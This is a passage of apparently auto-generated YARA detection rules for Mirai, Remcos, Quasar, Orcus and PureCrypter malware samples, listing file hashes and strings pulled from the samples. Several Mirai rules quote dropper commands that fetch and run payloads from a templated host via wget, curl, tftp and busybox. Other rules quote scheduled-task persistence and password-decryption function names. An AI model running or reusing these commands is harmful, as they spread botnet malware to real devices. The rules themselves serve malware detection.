      $s15 = "get_SetLastDirectorySeen" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e9ade001_Mirai_signature__f087b7e7_44 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e9ade001.elf, Mirai(signature)_f087b7e7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e9ade0016f8ed3409d9acb6a67e0599f7cd68c83caff97b5d744ba1315e7094d"
      hash2 = "f087b7e7ff0edbd7d75d403a724ff8d3f2ba31d25c530c30a34ba13ed842a7cc"
   strings:
      $s1 = "apt install tor -y > /dev/null" fullword ascii /* score: '12.00'*/
      $s2 = "/proc/%ld/cmdline" fullword ascii /* score: '12.00'*/
      $s3 = "liid*0+5%-Hdflkqjvm>%Lkq`i%Hdf%JV%]%45Z44Z3,%Duui`R`gNlq*354+2+2%-NMQHI)%iln`%B`fnj,%S`wvljk*<+4+7%Vdcdwl*354+2+2" fullword ascii /* score: '11.00'*/
      $s4 = "service tor start" fullword ascii /* score: '9.00'*/
      $s5 = "liid*0+5%-Hdflkqjvm>%Lkq`i%Hdf%JV%]%45Z45>%ws?66+5,%B`fnj*75455454%Clw`cj}*66+5" fullword ascii /* score: '8.00'*/
      $s6 = "liid*1+5%-fjhudqlgi`>%HVL@%<+5>%Rlkajrv%KQ%0+4>%Qwla`kq*0+5," fullword ascii /* score: '8.00'*/
      $s7 = "rwbkprwloj" fullword ascii /* score: '8.00'*/
      $s8 = "liid*0+5%-Rlkajrv%KQ%3+4>%RJR31,%Duui`R`gNlq*062+63%-NMQHI)%iln`%B`fnj,%Fmwjh`*04+5+7251+456%Vdcdwl*062+63" fullword ascii /* score: '8.00'*/
      $s9 = "liid*0+5%-Rlkajrv%KQ%45+5>%RJR31,%Duui`R`gNlq*062+63%-NMQHI)%iln`%B`fnj,%Fmwjh`*07+5+7216+443%Vdcdwl*062+63" fullword ascii /* score: '8.00'*/
      $s10 = "liid*0+5%-Rlkajrv%KQ%45+5>%Rlk31>%}31,%Duui`R`gNlq*062+63%-NMQHI)%iln`%B`fnj,%Fmwjh`*37+5+6757+<1" fullword ascii /* score: '8.00'*/
      $s11 = "liid*1+5%-fjhudqlgi`>%HVL@%<+5>%Rlkajrv%KQ%3+4>%Qwla`kq*0+5>%CpkR`gUwjapfqv," fullword ascii /* score: '8.00'*/
      $s12 = "dvvrjwa" fullword ascii /* score: '8.00'*/
      $s13 = "liid*1+5%-fjhudqlgi`>%HVL@%<+5>%Rlkajrv%KQ%3+4>%Qwla`kq*1+5>%BQG2+1>%LkcjUdqm+7>%VS4>%+K@Q%FIW%1+1+0=2<<>%RJR31>%`k(PV," fullword ascii /* score: '8.00'*/
      $s14 = "@KLBHD?%duui`q%kjq%cjpka" fullword ascii /* score: '8.00'*/
      $s15 = "liid*0+5%-Rlkajrv%KQ%45+5>%RJR31,%Duui`R`gNlq*062+63%-NMQHI)%iln`%B`fnj,%Fmwjh`*04+5+7251+456%Vdcdwl*062+63" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__RemcosRAT_signature__045d2444_RemcosRAT_signature__4e2701f9_45 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature).vbs, RemcosRAT(signature)_045d2444.vbs, RemcosRAT(signature)_4e2701f9.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bfaaf672b1741b950b48b3f2296d79bf38c18bc8f14fd1b38905721299811386"
      hash2 = "045d2444fe26511003ddfb15e92697fb6f0278754817448d12525d65e75f1fdc"
      hash3 = "4e2701f98ef8250ab1f2f9eef59f51fef7807e9c2cf226b7063be48a4b296b27"
   strings:
      $s1 = "SSMON_LogError \"SMTP Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '23.00'*/
      $s2 = "WshShell.LogEvent 1, in_strMessage" fullword ascii /* score: '21.00'*/
      $s3 = "Private Sub ProcessEvent" fullword ascii /* score: '18.00'*/
      $s4 = "WScript.Arguments.ShowUsage" fullword ascii /* score: '18.00'*/
      $s5 = "SSMON_LogError \"MapNetworkDrive Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '18.00'*/
      $s6 = "= in_xmlElement.getAttribute( \"serverPassword\" )" fullword ascii /* score: '17.00'*/
      $s7 = "= in_xmlElement.getAttribute( \"reportPeriodMinutes\" ) + 0" fullword ascii /* score: '16.00'*/
      $s8 = "= in_xmlElement.getAttribute( \"serverPort\" ) + 0" fullword ascii /* score: '16.00'*/
      $s9 = "WScript.Echo in_strMessage" fullword ascii /* score: '13.00'*/
      $s10 = "WScript.Echo Now" fullword ascii /* score: '13.00'*/
      $s11 = "WScript.Quit( 1 )" fullword ascii /* score: '13.00'*/
      $s12 = "If Not WScript.Arguments.Named.Exists(\"ConfigFile\") Then" fullword ascii /* score: '13.00'*/
      $s13 = "= in_xmlElement.getAttribute( \"formatAsHtml\" ) + 0" fullword ascii /* score: '13.00'*/
      $s14 = "WScript.Echo \"Verbose mode enabled\"" fullword ascii /* score: '13.00'*/
      $s15 = "WScript.Echo \"No administrator defined. Ignoring \" & in_strEmailSubject" fullword ascii /* score: '13.00'*/
   condition:
      ( ( uint16(0) == 0x5627 or uint16(0) == 0x0a0d ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__074e6f0b_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_46 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0ae8c502.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f3c0ed2.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b14108c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6b67447d.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_87688590.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9aa99c6f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6640f14.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b4cc1820.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d017447f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d42ac4e3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash2 = "0ae8c5022567fc8588fdc2fbf27d1d245f7e9bb15a23cb8a01962be6b51cb73c"
      hash3 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash4 = "2f3c0ed245f51ba046dc425e32409890f029a235cf0cc4330c5088bc1465053d"
      hash5 = "5b14108c4f7e043dd7e9a0f9a3793608bf5690ae37b4e624a06d10bfbc6e61c1"
      hash6 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash7 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash8 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash9 = "6b67447d97fcaca79ed98bcd6461b06445e978be3d45d4b0e2637057da97c4c2"
      hash10 = "8768859060387f56a2243b3d68d1b88fc12def261668c945d67ba7772f569b24"
      hash11 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash12 = "9aa99c6f7cab60192507282874b120aa0401f64a2a56c23ef23aa781a90e7c5f"
      hash13 = "a6640f14b119df661bb6d99d1e16a07a5d0f609c5d4ea3375ef3fa74bcab8d14"
      hash14 = "b4cc18207df83ad7c5fee8b34d2f2e680ba7dc45e51002d62712034a4cef69c6"
      hash15 = "d017447f8ef2d707ce3a908e05bcac2206d8f5b8d63b72e494a81eb379b69853"
      hash16 = "d42ac4e3da7e1aa7ae41d0547c0cdcf1e30300fb2ea96cea42bb1d43a5000b27"
      hash17 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
   strings:
      $s1 = "\" /sc ONLOGON /tr \"" fullword wide /* score: '16.00'*/
      $s2 = "get_RootKeyName" fullword ascii /* score: '15.00'*/
      $s3 = "GetCreateRegistryKeyResponse" fullword ascii /* score: '12.00'*/
      $s4 = "GetConnectionsResponse" fullword ascii /* score: '12.00'*/
      $s5 = "GetRenameRegistryKeyResponse" fullword ascii /* score: '12.00'*/
      $s6 = "GetDeleteRegistryKeyResponse" fullword ascii /* score: '12.00'*/
      $s7 = "get_OldKeyName" fullword ascii /* score: '12.00'*/
      $s8 = "GetRegistryKeysResponse" fullword ascii /* score: '12.00'*/
      $s9 = "get_NewKeyName" fullword ascii /* score: '12.00'*/
      $s10 = "move /y \"" fullword wide /* score: '12.00'*/
      $s11 = "subkeycount" fullword ascii /* score: '11.00'*/
      $s12 = "schtasks" fullword wide /* score: '11.00'*/
      $s13 = "rootKeyName" fullword ascii /* score: '10.00'*/
      $s14 = "set_RootKey" fullword ascii /* score: '10.00'*/
      $s15 = "GetCreateRegistryValueResponse" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e1770938_Mirai_signature__e4f442cd_Mirai_signature__e86ac18f_Mirai_signature__ef22eb12_Mirai_signature__f2_47 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e1770938.elf, Mirai(signature)_e4f442cd.elf, Mirai(signature)_e86ac18f.elf, Mirai(signature)_ef22eb12.elf, Mirai(signature)_f2192634.elf, Mirai(signature)_fc48857a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e177093844fcc3fd6fcb545fcc160c8f017fefc3d39a21ad62cb36ae58cbd076"
      hash2 = "e4f442cde97b712c91b0925053ee2fa8680fb15f33d2603fe653dff07ea8142c"
      hash3 = "e86ac18f7e339a2ef607a3123c4db2e4a4a8259990ba27e14210a8b0834ddceb"
      hash4 = "ef22eb1202da76a34463883d389b4ba38fec546f63448baa5ce23f14df37e3fb"
      hash5 = "f219263442304f6362382eaf0d76c978765279552ecc87a456279ae14c71885e"
      hash6 = "fc48857aab414493217664fe7ac3069d045b5f75429695c0fc35cbad64519311"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARCompact" fullword ascii /* score: '20.50'*/
      $s2 = "%s():%i: Circular dependency, skipping '%s'," fullword ascii /* score: '17.50'*/
      $s3 = "%s:%i: relocation processing: %s" fullword ascii /* score: '16.50'*/
      $s4 = "%s():%i: %s: usage count: %d" fullword ascii /* score: '14.50'*/
      $s5 = "%s():%i: Lib: %s already opened" fullword ascii /* score: '12.50'*/
      $s6 = "%s():%i: __address: %p  __info: %p" fullword ascii /* score: '12.50'*/
      $s7 = "%s():%i: running ctors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s8 = "%s():%i: running dtors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s9 = "searching RUNPATH='%s'" fullword ascii /* score: '10.00'*/
      $s10 = "%s():%i: Symbol \"%s\" at %p" fullword ascii /* score: '9.50'*/
      $s11 = "%s:%i: RELRO protecting %s:  start:%x, end:%x" fullword ascii /* score: '9.50'*/
      $s12 = "%s():%i: removing loaded_modules: %s" fullword ascii /* score: '9.50'*/
      $s13 = "%s():%i: Move %s from pos %d to %d in INIT/FINI list." fullword ascii /* score: '9.50'*/
      $s14 = "%s():%i: Trying to dlopen '%s', RTLD_GLOBAL:%d RTLD_NOW:%d" fullword ascii /* score: '9.50'*/
      $s15 = "%s():%i: Looking for needed libraries" fullword ascii /* score: '9.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _OrcusRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__OrcusRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__48 {
   meta:
      description = "_subset_batch - from files OrcusRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, OrcusRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_eb8df076.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b14108c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2c9a9ebdf13c0c7994382cb7e01fe0374bf43253dd58f908f60be03177753a1"
      hash2 = "eb8df076a9c27ca87f349a751a3f74d8f121ec0e96da996942d02099510085ea"
      hash3 = "5b14108c4f7e043dd7e9a0f9a3793608bf5690ae37b4e624a06d10bfbc6e61c1"
   strings:
      $s1 = "get_Passwordcheck" fullword ascii /* score: '17.00'*/
      $s2 = "ProcessExtensions" fullword ascii /* score: '15.00'*/
      $s3 = "DecryptIePassword" fullword ascii /* score: '14.00'*/
      $s4 = "set_Passwordcheck" fullword ascii /* score: '12.00'*/
      $s5 = "RegistryKeyExtensions" fullword ascii /* score: '12.00'*/
      $s6 = "<Passwordcheck>k__BackingField" fullword ascii /* score: '12.00'*/
      $s7 = "password-check" fullword wide /* score: '12.00'*/
      $s8 = "OpenReadonlySubKey" fullword ascii /* score: '10.00'*/
      $s9 = " 1.85 (Hash, version 2, native byte-order)" fullword wide /* score: '10.00'*/
      $s10 = "get_EntrySalt" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b63c5a52_PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1_49 {
   meta:
      description = "_subset_batch - from files PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b63c5a52.exe, PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e1c122ce.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b63c5a5243d34fa9387482e64b4cb1193c7e87aa701e5366e10f6ea7afe13d7c"
      hash2 = "e1c122ce599ecc31195184ce2bdfcd2282ea0de610e86b0bf862b69178b8f4ac"
   strings:
      $s1 = "\"http://ocsp2.globalsign.com/rootr606" fullword ascii /* score: '20.00'*/
      $s2 = "%http://crl.globalsign.com/root-r6.crl0G" fullword ascii /* score: '16.00'*/
      $s3 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii /* score: '16.00'*/
      $s4 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii /* score: '16.00'*/
      $s5 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii /* score: '16.00'*/
      $s6 = "3http://ocsp.globalsign.com/gsgccr45evcodesignca20200U" fullword ascii /* score: '13.00'*/
      $s7 = "6http://crl.globalsign.com/gsgccr45evcodesignca2020.crl0" fullword ascii /* score: '13.00'*/
      $s8 = "-http://ocsp.globalsign.com/ca/gstsacasha384g40C" fullword ascii /* score: '13.00'*/
      $s9 = "@http://secure.globalsign.com/cacert/gsgccr45evcodesignca2020.crt0?" fullword ascii /* score: '13.00'*/
      $s10 = "0http://crl.globalsign.com/ca/gstsacasha384g4.crl0" fullword ascii /* score: '13.00'*/
      $s11 = ")Globalsign TSA for Advanced - G4 - 202311" fullword ascii /* score: '12.00'*/
      $s12 = ")Globalsign TSA for Advanced - G4 - 2023110" fullword ascii /* score: '12.00'*/
      $s13 = "(GlobalSign Timestamping CA - SHA384 - G40" fullword ascii /* score: '11.00'*/
      $s14 = "(GlobalSign Timestamping CA - SHA384 - G4" fullword ascii /* score: '11.00'*/
      $s15 = "GlobalSign Root CA - R61" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__175bef16_PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1_50 {
   meta:
      description = "_subset_batch - from files PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_175bef16.exe, PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_50f9b0aa.exe, PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dedc2836.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "175bef16ead76c37e985239e103f32e0e2259c51a68c05d75392758c25fdebc7"
      hash2 = "50f9b0aa52b26d05fe991fd06d471fe3fae406d4660c0faf592e9f4aca1388b9"
      hash3 = "dedc2836daceec9c18c41b1107948c3317786952143b9a7a4a11672e54db14c4"
   strings:
      $s1 = "DownloadCompletedEventArgs" fullword ascii /* score: '13.00'*/
      $s2 = "get_DecryptedData" fullword ascii /* score: '11.00'*/
      $s3 = "DownloadToBuffer" fullword ascii /* score: '10.00'*/
      $s4 = "PipelineHandlers" fullword ascii /* score: '10.00'*/
      $s5 = "get_MegaBytes" fullword ascii /* score: '9.00'*/
      $s6 = "get_LargestWholeNumberValue" fullword ascii /* score: '9.00'*/
      $s7 = "DecryptionCompletedEventArgs" fullword ascii /* score: '9.00'*/
      $s8 = "OnDecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s9 = "get_GigaBytes" fullword ascii /* score: '9.00'*/
      $s10 = "get_PetaBytes" fullword ascii /* score: '9.00'*/
      $s11 = "get_LargestWholeNumberSymbol" fullword ascii /* score: '9.00'*/
      $s12 = "get_KiloBytes" fullword ascii /* score: '9.00'*/
      $s13 = "get_TeraBytes" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e0e4fe62_Mirai_signature__e1c86a18_Mirai_signature__e25fd9a7_Mirai_signature__e4c0399e_Mirai_signature__f2_51 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e0e4fe62.elf, Mirai(signature)_e1c86a18.elf, Mirai(signature)_e25fd9a7.elf, Mirai(signature)_e4c0399e.elf, Mirai(signature)_f2e0f63b.elf, Mirai(signature)_f422c102.elf, Mirai(signature)_f6c82004.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e0e4fe62b7d6de7c7f84cc9f6a7082f20c0eed2967b0370f6b814a802476d17f"
      hash2 = "e1c86a189cf8d89b0d096ac46899e691b68bc65942ff44ac14e9d75e1fbca802"
      hash3 = "e25fd9a72ffdf547cbbdda70d3419183efc01e94d91cfa9f3ad16b9c244931d1"
      hash4 = "e4c0399e873a8e5c2907ea700d8841121f4686abe6f95644ec01ec3ba28db4a5"
      hash5 = "f2e0f63b0440da9e40485d2fe5e18509d059eb3c8e7b54ee1267a58619745c46"
      hash6 = "f422c102cdfb10f6d5e2eca65b8fec443d4f08340f116780ce34c746957217b2"
      hash7 = "f6c8200485d56e28cbc23a27c667a4ed7a5baf88e5edcef7d4326eedc348473b"
   strings:
      $s1 = "Origin: https://www.facebook.com" fullword ascii /* score: '21.00'*/
      $s2 = "Origin: https://www.twitter.com" fullword ascii /* score: '21.00'*/
      $s3 = "Origin: https://www.linkedin.com" fullword ascii /* score: '21.00'*/
      $s4 = "Origin: https://www.yahoo.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.amazon.com" fullword ascii /* score: '21.00'*/
      $s6 = "Origin: https://www.reddit.com" fullword ascii /* score: '21.00'*/
      $s7 = "Origin: https://www.netflix.com" fullword ascii /* score: '21.00'*/
      $s8 = "Origin: https://www.google.com" fullword ascii /* score: '21.00'*/
      $s9 = "Origin: https://www.bing.com" fullword ascii /* score: '21.00'*/
      $s10 = "Origin: https://www.youtube.com" fullword ascii /* score: '21.00'*/
      $s11 = "Referer: https://www.linkedin.com/" fullword ascii /* score: '17.00'*/
      $s12 = "Referer: https://www.yahoo.com/" fullword ascii /* score: '17.00'*/
      $s13 = "Referer: https://www.twitter.com/" fullword ascii /* score: '17.00'*/
      $s14 = "Referer: https://www.youtube.com/" fullword ascii /* score: '17.00'*/
      $s15 = "Referer: https://www.bing.com/" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e6de6d9a_Mirai_signature__e6ee3f14_Mirai_signature__e94b599c_Mirai_signature__ea63ef8a_Mirai_signature__ee_52 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e6de6d9a.elf, Mirai(signature)_e6ee3f14.elf, Mirai(signature)_e94b599c.elf, Mirai(signature)_ea63ef8a.elf, Mirai(signature)_eede5507.elf, Mirai(signature)_f3a61b29.elf, Mirai(signature)_ff5c3ffa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e6de6d9aa9f6f742f6c2e743c2788285691b276341092adddd3405a7e958a944"
      hash2 = "e6ee3f1443dae2a9e4d05a93fb673f45214d81b14ae243faabd2f3db4e090c00"
      hash3 = "e94b599c296e384e3045963950320c0c25467d763a968b8ddb94ec43a699c3f5"
      hash4 = "ea63ef8a6ed97de3558bd21c4674c601e7e51b04065429221a922cfecd469cfb"
      hash5 = "eede55076d620735e8947187f7d4d171ea0ee3e16c1096f8882fb97252b287a6"
      hash6 = "f3a61b2979615927dd1522993fa076f0b217844e0e1862376d789c1e99383609"
      hash7 = "ff5c3ffaa96346a56e9c7caa78a695ca157c06c4343ca1567784a7b4ceffcb68"
   strings:
      $s1 = "cd %s && tftp -g -r %s %s" fullword ascii /* score: '23.00'*/
      $s2 = "tftp %s -c get %s %s" fullword ascii /* score: '20.00'*/
      $s3 = "ftpget -v -u anonymous -p anonymous -P 21 %s %s %s" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://%s/%s/%s -O %s" fullword ascii /* score: '19.00'*/
      $s5 = "curl -o %s http://%s/%s/%s" fullword ascii /* score: '18.00'*/
      $s6 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" fullword ascii /* score: '12.00'*/
      $s8 = "/usr/sbin/wget" fullword ascii /* score: '12.00'*/
      $s9 = "/usr/sbin/tftp" fullword ascii /* score: '12.00'*/
      $s10 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9" fullword ascii /* score: '12.00'*/
      $s11 = "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s12 = "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s13 = "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s14 = "/usr/sbin/ftpget" fullword ascii /* score: '12.00'*/
      $s15 = "/usr/sbin/rsyslogd" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e7175661_Mirai_signature__f38db67a_53 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e7175661.elf, Mirai(signature)_f38db67a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e71756615a6f6a49ce607f36470aa5d7d9dc239aea5accee21598ab64ecf17f9"
      hash2 = "f38db67a038dec44df5b6d3e4a36b81f05574f7105da26bd75d64bd701ae1399"
   strings:
      $s1 = "cd /tmp || cd /var || cd /dev/shm;wget http://%s/telnet.sh; curl -O http://%s/telnet.sh; chmod 777 telnet.sh; sh telnet.sh; " fullword ascii /* score: '25.00'*/
      $s2 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/busybox wget http://%s/mips; " ascii /* score: '25.00'*/
      $s3 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/busybox wget http://%s/mips; " ascii /* score: '25.00'*/
      $s4 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s5 = "HEAD / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s6 = "[0mWrong password!" fullword ascii /* score: '12.00'*/
      $s7 = "!shellcmd " fullword ascii /* score: '12.00'*/
      $s8 = "Login:" fullword ascii /* score: '12.00'*/
      $s9 = "[0mNo shell available" fullword ascii /* score: '12.00'*/
      $s10 = "/command/" fullword ascii /* score: '12.00'*/
      $s11 = "login:" fullword ascii /* score: '12.00'*/
      $s12 = "POST / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s13 = "ftpget" fullword ascii /* score: '10.00'*/
      $s14 = "/proc/%s/comm" fullword ascii /* score: '10.00'*/
      $s15 = "/fhrom/fhshell/" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e64a7016_Mirai_signature__e724c031_Mirai_signature__f39b67ff_Mirai_signature__f655d8f9_Mirai_signature__fa_54 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e64a7016.elf, Mirai(signature)_e724c031.elf, Mirai(signature)_f39b67ff.elf, Mirai(signature)_f655d8f9.elf, Mirai(signature)_fa34cf14.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e64a7016accf95f6c7ca9f60183d9f34e1dc47bf66f27889964bfd185f3afa97"
      hash2 = "e724c0315b16e070a8408bd63678b363419b127313335303bd660c6333b490b3"
      hash3 = "f39b67fff1f106fb1b4fa9beb386427c8e7eb010f306ad0445da70bffc855f2e"
      hash4 = "f655d8f958ac76b94b196b1e4db839cf75599f7f71f31cd92d3d60609f330521"
      hash5 = "fa34cf14bba7b0ef493975bfb844eba1971d9c2902b7cc3efded5e25d8c6d405"
   strings:
      $s1 = "__stdio_init_mutex" fullword ascii /* score: '15.00'*/
      $s2 = "__get_hosts_byname_r" fullword ascii /* score: '14.00'*/
      $s3 = "gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s4 = "__GI_gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s5 = "gethostbyname_r.c" fullword ascii /* score: '14.00'*/
      $s6 = "get_hosts_byname_r.c" fullword ascii /* score: '14.00'*/
      $s7 = "__read_etc_hosts_r" fullword ascii /* score: '12.00'*/
      $s8 = "read_etc_hosts_r.c" fullword ascii /* score: '12.00'*/
      $s9 = "decoded.c" fullword ascii /* score: '11.00'*/
      $s10 = "__decode_header" fullword ascii /* score: '11.00'*/
      $s11 = "__encode_header" fullword ascii /* score: '9.00'*/
      $s12 = "encoded.c" fullword ascii /* score: '9.00'*/
      $s13 = "__open_etc_hosts" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e2bd07c2_Mirai_signature__e537e1d6_Mirai_signature__e5820391_Mirai_signature__e64a7016_Mirai_signature__e6_55 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e2bd07c2.elf, Mirai(signature)_e537e1d6.elf, Mirai(signature)_e5820391.elf, Mirai(signature)_e64a7016.elf, Mirai(signature)_e6fc7806.elf, Mirai(signature)_e724c031.elf, Mirai(signature)_e98a982a.elf, Mirai(signature)_f21b61ed.elf, Mirai(signature)_f655d8f9.elf, Mirai(signature)_fcdd1016.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
